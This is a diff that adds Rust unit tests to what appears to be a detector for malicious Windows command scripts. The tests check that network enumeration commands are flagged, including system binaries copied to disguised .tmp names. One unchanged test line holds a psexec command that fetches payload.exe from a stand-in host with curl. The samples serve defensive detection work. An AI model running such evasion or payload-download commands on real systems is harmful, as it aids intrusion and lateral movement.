@@ -3710,6 +3710,72 @@ C:\Users\Public\pg.tmp -n 1 c2.example
     }
 
     #[test]
+    fn network_utility_enumeration_commands_emit_traits() {
+        let script = br#"ipconfig /all
+getmac
+netstat -ano
+arp -a
+route print
+"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        for kind in ["ipconfig", "getmac", "netstat", "arp", "route"] {
+            assert!(
+                report.traits.iter().any(|t| matches!(
+                    t,
+                    Trait::Enumeration { enum_kind, .. } if enum_kind == kind
+                )),
+                "missing network enumeration kind {kind}: {:?}",
+                report.traits
+            );
+        }
+    }
+
+    #[test]
+    fn copied_network_utility_aliases_emit_enumeration_traits() {
+        let script = br#"copy C:\Windows\System32\ipconfig.exe C:\Users\Public\ip.tmp
+C:\Users\Public\ip.tmp /all
+copy C:\Windows\System32\getmac.exe C:\Users\Public\gm.tmp
+C:\Users\Public\gm.tmp
+copy C:\Windows\System32\netstat.exe C:\Users\Public\ns.tmp
+C:\Users\Public\ns.tmp -ano
+copy C:\Windows\System32\arp.exe C:\Users\Public\ap.tmp
+C:\Users\Public\ap.tmp -a
+copy C:\Windows\System32\route.exe C:\Users\Public\rt.tmp
+C:\Users\Public\rt.tmp print
+"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        for target in [
+            r#"C:\Users\Public\ip.tmp"#,
+            r#"C:\Users\Public\gm.tmp"#,
+            r#"C:\Users\Public\ns.tmp"#,
+            r#"C:\Users\Public\ap.tmp"#,
+            r#"C:\Users\Public\rt.tmp"#,
+        ] {
+            assert!(
+                report.traits.iter().any(|t| matches!(
+                    t,
+                    Trait::ManipulatedExec { target: t, .. }
+                        if t.eq_ignore_ascii_case(target)
+                )),
+                "copied network enumeration alias {target} was not surfaced: {:?}",
+                report.traits
+            );
+        }
+        for kind in ["ipconfig", "getmac", "netstat", "arp", "route"] {
+            assert!(
+                report.traits.iter().any(|t| matches!(
+                    t,
+                    Trait::Enumeration { enum_kind, .. } if enum_kind == kind
+                )),
+                "missing copied network enumeration kind {kind}: {:?}",
+                report.traits
+            );
+        }
+    }
+
+    #[test]
     fn psexec_replays_remote_cmd_child() {
         let script = br#"psexec \\target.example -u admin -p pass cmd.exe /V:ON /c set U=https://psexec-wrapper.example/payload.exe&&curl -o payload.exe !U!"#;
         let report = analyze(script, &AnalyzeConfig::default());
